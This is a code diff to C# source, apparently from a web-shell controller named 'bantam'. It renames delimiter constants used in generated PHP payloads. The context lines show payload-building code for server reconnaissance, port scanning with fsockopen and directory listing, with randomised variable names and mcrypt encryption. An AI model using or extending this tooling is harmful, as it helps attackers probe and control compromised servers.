@@ -9,12 +9,12 @@ namespace bantam.Classes
         /// <summary>
         /// 
         /// </summary>
-        public const string rowSeperator = "|=$=|";
+        public const string responseDataSeperator = ",.$.,";
 
         /// <summary>
         /// 
         /// </summary>
-        public const string g_delimiter = ",.$.,";
+        public const string responseDataRowSeperator = "|=$=|";
 
         /// <summary>
         /// PHP
@@ -143,7 +143,7 @@ namespace bantam.Classes
         /// <returns></returns>
         public static string McryptEncryption(string varName, string encryptionKey, string encryptionIV)
         {
-            string result = string.Empty;
+            string result;
             string padVar = RandomPHPVar();
             string blockBar = RandomPHPVar();
 
@@ -240,18 +240,18 @@ namespace bantam.Classes
                 responseCode = "echo ";
             }
 
-            responseCode += osVar + ".'" + g_delimiter
-                     + "'." + cwdVar + ".'" + g_delimiter
-                     + "'." + freespaceVar + ".'" + g_delimiter
-                     + "'." + totalfreespaceVar + ".'" + g_delimiter
-                     + "'." + releaseVar + ".'" + g_delimiter
-                     + "'." + kernelVar + ".'" + g_delimiter
-                     + "'." + serverIpVar + ".'" + g_delimiter
-                     + "'." + serverSoftwareVar + ".'" + g_delimiter
-                     + "'." + userVar + ".'" + g_delimiter
-                     + "'." + uidVar + ".'" + g_delimiter
-                     + "'." + gidVar + ".'" + g_delimiter
-                     + "'." + groupVar + ".'" + g_delimiter
+            responseCode += osVar + ".'" + responseDataSeperator
+                     + "'." + cwdVar + ".'" + responseDataSeperator
+                     + "'." + freespaceVar + ".'" + responseDataSeperator
+                     + "'." + totalfreespaceVar + ".'" + responseDataSeperator
+                     + "'." + releaseVar + ".'" + responseDataSeperator
+                     + "'." + kernelVar + ".'" + responseDataSeperator
+                     + "'." + serverIpVar + ".'" + responseDataSeperator
+                     + "'." + serverSoftwareVar + ".'" + responseDataSeperator
+                     + "'." + userVar + ".'" + responseDataSeperator
+                     + "'." + uidVar + ".'" + responseDataSeperator
+                     + "'." + gidVar + ".'" + responseDataSeperator
+                     + "'." + groupVar + ".'" + responseDataSeperator
                      + "'." + phpVersionVar + ";";
 
             List<string> userInfoLines = new List<string> {
@@ -328,7 +328,7 @@ namespace bantam.Classes
                      + "foreach ($ports as " + portVar + ") {"
                         + connectionVar + " = @fsockopen('" + host + "', " + portVar  + ", " + errNoVar + ", "+ errVar + ", 2);"
                          + "if (is_resource(" + connectionVar  + ")) { "
-                             + "$result .= " + portVar + " . ' ' . getservbyport(" + portVar + ", 'tcp'). '" + rowSeperator + "';"
+                             + "$result .= " + portVar + " . ' ' . getservbyport(" + portVar + ", 'tcp'). '" + responseDataRowSeperator + "';"
                              + "fclose(" + connectionVar + ");"
                         + "}}"
                      + "if (empty($result)) { $result = 'None'; }";
@@ -579,11 +579,11 @@ namespace bantam.Classes
                  "try {",
                  "foreach (new DirectoryIterator('" + location + "') as " + varItem + ") {",
 
-                 responseCode + varItem + "->getBasename().'" + g_delimiter + "'."
-                        + varItem + "->getPath().'" + g_delimiter + "'."
-                        + "((" + varItem + "->isFile()) ? " + varItem + "->getSize() : '').'" + g_delimiter + "'."
-                        + "((" + varItem + "->isFile()) ? 'file' : 'dir').'" + g_delimiter + "'."
-                        + varItem + "->getPerms().'" + rowSeperator + "';",
+                 responseCode + varItem + "->getBasename().'" + responseDataSeperator + "'."
+                        + varItem + "->getPath().'" + responseDataSeperator + "'."
+                        + "((" + varItem + "->isFile()) ? " + varItem + "->getSize() : '').'" + responseDataSeperator + "'."
+                        + "((" + varItem + "->isFile()) ? 'file' : 'dir').'" + responseDataSeperator + "'."
+                        + varItem + "->getPerms().'" + responseDataRowSeperator + "';",
 
                  "}}catch(Exception " + varException + "){ }"
             };
